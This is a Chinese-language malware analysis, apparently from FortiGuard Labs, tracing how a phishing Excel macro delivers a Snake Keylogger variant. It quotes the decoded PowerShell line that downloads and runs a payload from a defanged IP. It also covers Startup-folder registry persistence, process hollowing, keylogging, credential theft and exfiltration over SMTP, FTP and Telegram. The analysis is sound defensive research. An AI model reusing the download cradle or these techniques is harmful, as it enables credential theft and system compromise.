执行摘要

近日，FortiGuard 实验室在野外捕获了一个用于传播恶意软件的 Microsoft Excel 样本。在研究了它的行为后，我发现它是 Snake Keylogger的一个新变体。

Snake Keylogger 是一种使用 .NET 开发的恶意软件。它于 2020 年末首次出现，专注于从受害者设备中窃取敏感信息，包括保存的凭据、受害者的键盘记录、屏幕截图和剪贴板数据。

2021年 7 月，Snake Keylogger 首次进入 TOP 10 流行恶意软件，这意味着 Snake Keylogger 家族的影响力正在增加，并影响更多人的设备和敏感数据。

在本文中，您将了解如何通过捕获的 Excel 样本下载和执行 Snake Keylogger 变体，该变体使用哪些技术来保护它不被分析，它从受害者的机器窃取了哪些敏感信息，以及它如何将这些信息提交给攻击者。

 


捕获的 Microsoft Excel样本

此 Excel 样本作为网络钓鱼电子邮件中的附件提供，并包含恶意宏 VBA 代码。图 1.1 显示了打开时的屏幕截图。它显示文档的模糊图片，并要求受害者单击黄色按钮以获得更清晰的图像。

图 1.1 打开时的 Excel 文件内容

一旦受害者点击黄色按钮“Enable Content”，恶意的 VBA 代码就会在后台执行。包含恶意 VBA 代码的宏项目受密码保护，因此分析器无法查看。但是，我们能够修改其二进制文件来消除此限制。

浏览其代码，打开文档时会自动调用“Workbook_Activate()”方法。它将一段PowerShell代码从局部变量写入 BAT 文件。图1.2显示了该方法的部分VBA代码，其中变量“s”存放PowerShell代码，“Gqyztfbtsogpnruooqr.bat”为BAT文件，最终通过调用代码“x = Shell(bat, 0)”执行。

图 1.2 在后台执行的宏 VBA 代码

图1.2的底部显示了变量 “s ”的内容，它包含base64编码的PowerShell代码，在执行时被PowerShell.exe解码。

下面是base64解码的PowerShell代码：

$ProcName = "Wheahmnfpgaqse.exe";

(New-ObjectSystem.Net.WebClient).DownloadFile("hxxp[:]//3[.]64[.]251[.]139/v3/2/Requests07520000652.exe","$env:APPDATA\$ProcName");

Start-Process ("$env:APPDATA\$ProcName")

PowerShell的代码非常简单易懂。它下载了一个文件（“Requests07520000652.exe”）到受害者的设备上，通过调用 “DownloadFile()”将其放置在“%AppData%\Wheahmnfpgaqse.exe”，并通过调用 “Start-Process()”执行它。



Snake Keylogger下载器

经过一番研究，我发现文件“Wheahmnfpgaqse.exe ”是Snake Keylogger的下载器，它是一个.Net程序。当它启动时，它会休眠21秒，以绕过那些沙箱，并在触发无操作超时时终止样本进程。

图2.1 休眠后下载并解密Snake Keylogger模块

21秒后，下载器调用了一个名为 “Consturctor() ”的函数，如图2.1所示。然后调用另一个函数“Program.List_Types()”，它从链接 “hxxps[:]//store2[.]gofile[.]io/download/0283e6ba-afc6-4dcb-b2f4-3173d666e2c4/Huzeigtmvaplpinhoo.dll”下载Snake Keylogger模块，这是一个RC4加密的DLL文件。接下来，它调用 “ToRc() ”函数，使用解密密钥 “Dllzjn ”对其进行RC4解密。

然后，它继续加载解密的Dll模块（一个.Net Dll文件，名为 "Huzeigtmvaplpinhoo.dll"），并枚举其导出函数，以找到 “G6doICqoMU()”，它是通过执行函数Concurctor()中的 “type.InvokeMember(\"G6doICqoMU\", BindingFlags.InvokeMethod,null, null) ”来调用，如图2.1所示。解密后的.NetDll是Snake Keylogger的dropper（投放器）和installer（安装程序）。

让我们深入研究这个模块，看看它是如何执行任务的。

 


Snake Keylogger安装程序

根据我的分析，解密后的Dll模块（"Huzeigtmvaplpinhoo.dll"）将Snake Keylogger部署到受害者的设备上，并将其设置为一个自动运行的程序。它从Resource目录中提取一个可执行的PE文件到内存中，然后执行Process Hollowing（进程镂空），将可执行的PE文件注入到新创建的子进程中并执行它。

本部分将详细解释它如何执行这些功能。

1.持久化机制

图3.1调试器dnSpy中导出函数“G6doICqoMU（）”的中断

图3.1显示了解密后的Dll模块（"Huzeigtmvaplpinhoo.dll"）的概要。正如你所看到的，为了防止其代码被分析，该文件被混淆了，所以类名、函数名和变量名都是随机生成的无意义的字符串。这为分析人员在分析时增加了难度。

导出函数“G6doICqoMU()”的全名是 “Huzeigtmvaplpinhoo!pXfqpio3clcAoFxTnfJ.CORFgLoyRGlurYwdwIh.G6doICqoMU()”。同样，出于与之前相同的原因，它会在此功能开始时休眠 35 秒以绕过某些恶意软件分析系统。

接下来，它可以使这个Snake Keylogger在受感染的 Windows 上持久存在。我们都知道，Windows系统在 “Start Menu”中有一个 “Startup”文件夹，当Windows启动时，这个文件夹中的程序就会被启动。这个文件夹的完整路径在系统注册表中定义，字符串值为“HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\ShellFolders\Startup” 和“HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserShell Folders\Startup”。默认情况下，“Startup”的值为C:\Users\{UserName}\AppData\Roaming\MicrosoftWindows\StartMenu\Programs\Startup。

Snake Keylogger 的这种变体将“Startup”的两个值都改为其他文件夹。图3.2显示了通过调用API SetValue()将Windows的启动文件夹改为 “C:\Users\M0YTes0Env\AppData\Roaming\Microsoft\Windows\StartMenu\Programs\chsg\”的代码。在图3.2的下半部分，可以看到系统注册表路径、值名称和新值数据的内容。

图 3.2 将 Windows“Startup”文件夹更改为新路径

“chsg ”是一个由Snake Keylogger创建的新文件夹。该程序将Snake Keylogger文件（下载的“Wheahmnfpgaqse.exe”）复制到该文件夹，并将其重命名为“ sgosr.exe”。这确保了Snake Keylogger每次启动时都会被Windows系统启动。

 

2.从资源中提取

虽然Huzeigtmvaplpinhoo.dll的内容只出现在内存中，但为了分析它，我把它保存到一个本地文件中。它在Resource目录中有几个资源，如下图3.3所示。

图 3.3 Huzeigtmvaplpinhoo.dll 的资源目录显示

提取Snake Keylogger的payload文件的过程有点复杂。它使用一种棘手的方式来加载资源。它有一个由注册到 AppDomain.ResourceResolve 的ResolveEventHandler 定义的本地回调函数，然后当它无法按名称加载资源时调用该函数。它看起来像是 Windows SEH 策略的异常处理程序，用于处理异常。此外，它还有另一个注册到AppDomain.AssemblyResolve的本地回调函数，当它无法按名称加载程序集（如模块）时调用该回调函数。

下面是注册本地资源解析的伪代码，其中 T9wOjU5ccxTJaVfUntn.Osc50oil0l 是本地回调函数。

AppDomain.ResourceResolve += newResolveEventHandler(T9wOjU5ccxTJaVfUntn.Osc50oil0l)

现在，让我们看看 Snake Keylogger 是如何解决这个难题的：加载一个不存在的资源，这将触发资源加载失败。它计划从当前模块中读取名为“Qkxkikeg”的资源，而该模块在 Resource 目录中没有这样的命名资源，如图 3.3 所示。出现资源加载失败，调用注册的本地ResolveEventHandler函数解决该错误。这会导致加载程序集失败并调用其程序集解析回调函数。

不久之后，另一个从资源“{d977ee8c-85ce-4731-b9a1-323ba88c6eeb} ”解密的PE文件出现在内存中。它包含一个名为“Qkxkikeg”的资源，它是原始请求资源名称，如图 3.4 所示。


图3.4 “Qkxkikeg”资源在另一个模块中

snake Keylogger的payload只是在资源目录“ClassLibrary1.Properties.Resources”下的资源“Qkxkikeg”中以GZIP格式进行了压缩。

图3.5在左边显示了资源 “Qkxkikeg ”的GZIP数据（反转），在右边显示了解压后的Snake Keylogger。

图 3.5 “Qkxkikeg”的压缩和解压数据

 

3. Process Hollowing

然后，该程序创建一个挂起的子进程，并将压缩的Snake Keylogger Payload部署到该子进程中，然后它恢复子进程的运行。同时，父进程通过调用函数Environment.Exit(0)退出。

图 3.6 创建一个挂起的子进程

根据图3.6中的代码，它即将调用API CreateProcess()来创建Creation Flag为134217732U (0x8000004)的子进程，即CREATE_NO_WINDOW和CREATE_SUSPENDED。

然后它调用 API WriteProcessMemory() 将 Snake Keylogger的Payload逐段复制到子进程中。接下来它调用 SetThreadContext() 使子进程指向 Snake Keylogger 的入口函数。在父进程退出之前，调用 APIResumeThread() 使子进程恢复运行。

 

 

Snake Keylogger Payload

图 4.1 完全混淆的 Snake Keylogger Payload

Snake Keylogger Payload文件的代码已完全混淆，如图 4.1 所示，以防止其被分析。类和函数名称不可读。

因此，为了更好地分析和解释其代码和意图，我使用“de4dot”工具对Payload文件进行了反混淆处理。使其代码更具可读性，我的分析基于该结果。

通过Snake Keylogger的代码，我意识到它提供的功能包括记录受害者的击键（键盘记录器），从剪贴板中窃取数据，获取受害者的屏幕截图，窃取系统剪贴板上的数据，以及窃取受害者设备上安装的一些指定软件客户端保存的凭证。

1.键盘记录功能

图 4.2 显示了设置键盘记录器的代码片段。

图 4.2 键盘记录器的初始化

它调用 API SetWindowsHookExA() 来注册一个Hook回调函数( this.callback_ProcessKey() ) 来监控低级键盘输入事件。第一个参数是Hook类型，其中“13”表示WH_KEYBOARD_LL。

之后，Windows 系统会在受害者键入时调用回调函数，因此它能够处理按键并将其记录到全局字符串变量中。它还通过调用API GetForegroundWindow() 和 GetWindowText ()来记录前景窗口标题以识别受害者键入的位置。

它还有一个定时器 (Timer0)，可以不断向攻击者发送键盘记录数据。

 

2. 屏幕截图

它能够截取受害者设备的屏幕截图。它有一个定时器（Timer1），它通过调用 API CopyFromScreen() 不时地捕获受害者的屏幕截图，并将截图保存到系统的“MyDocuments”文件夹中的本地 Screenshot.png 文件中。它还将此图片文件发送给攻击者。

 

3. 系统剪贴板

它有两个定时器。一个（Time2）用于通过调用Clipboard.GetText()收集系统剪贴板数据并保存到全局变量。另一个（Time3）用于将收集到的剪贴板数据发送给攻击者。

图 4.3 获取系统剪贴板数据的定时器函数

 

图 4.3 显示了用于获取系统剪贴板数据的 Timer 函数。每次倒计时时，它都会检查当前剪贴板数据是否已收集到全局变量 main_cls.string_clipboard_data 中。如果没有，它将当前剪贴板数据追加到全局变量中。

 

4. 窃取凭据

根据我的分析，这个变体的主要工作是从受害者的设备上窃取凭据。它在Main()函数中实现了窃取凭证，如下图4.4所示。

图 4.4 Main() 具有窃取凭据并提交凭据的函数

这是去混淆的 Main() 函数，显示了用于从各种客户端窃取凭据的函数。底部的函数提交被盗凭据。这些函数从每个软件的不同位置获取每个软件的保存凭据，包括本地文件（如 Chrome）和系统注册表（如 Outlook）等。

我现在将使用 Outlook 作为示例来解释 Snake Keylogger 如何收集凭据。

图 4.5 是即将从系统注册表中读取 Microsoft Outlook 凭据的函数的截图。它通过不同 Outlook 版本的四个注册表路径来读出（如果适用）“电子邮件”和“IMAP 密码”或“POP3 密码”或“HTTP 密码”或“SMTP密码”和“SMTP 服务器”。

图 4.5 为 Microsoft Outlook 收集已保存凭据的功能

将窃取的数据发送给攻击者

据此 Snake Keylogger 变体的代码，它会向攻击者发送一封电子邮件（使用SMTP 协议），以提交被盗的受害者凭据数据。

SnakeKeylogger 收集有关受害者 Windows 系统的基本信息，例如用户名、PC 名称、系统日期和时间、公共 IP 地址和国家/地区，这些信息放在收集到的凭据的标题中。

图 5.1 用窃取的凭据制作电子邮件

 

图 5.1 显示了使用窃取的凭据制作要发送给攻击者的电子邮件。底部是电子邮件的主题和正文。窃取的凭据放在两个附件中，“Passwords.txt”和“User.txt”。图5.2是 "Password.txt "的截图，它被附在发给攻击者的电子邮件中，其中包括从我的测试Windows系统中窃取的基本信息和凭证。

图 5.2 “Password.txt”示例

为了将窃取的数据发送给攻击者，它定义了一些变量，包括发件人的电子邮件地址、密码、SMTP 服务器地址和 SMTP 端口，如图 5.3 所示。它在类的构造函数中定义了这些变量。

图 5.3 攻击者的电子邮件地址被硬编码在构造函数中

除了通过电子邮件发送数据外，这个 Snake Keylogger 变体还提供了 FTP 和 Telegram 方法来将收集的敏感数据提交给攻击者。

对于FTP，攻击者需要设置一个FTP服务器，然后告诉Snake Keylogger FTP服务器的地址和Snake Keylogger上传被盗敏感数据的凭据。

对于 Telegram，Snake Keylogger 使用“Telegram Bot API”的“sendDocument”方法将其窃取的数据提交到攻击者提供的 Telegram 账户。有关 Telegram 方法的更多信息，请参见图 5.4。

结论

图 6.1 Snake Keylogger 变体的流程图
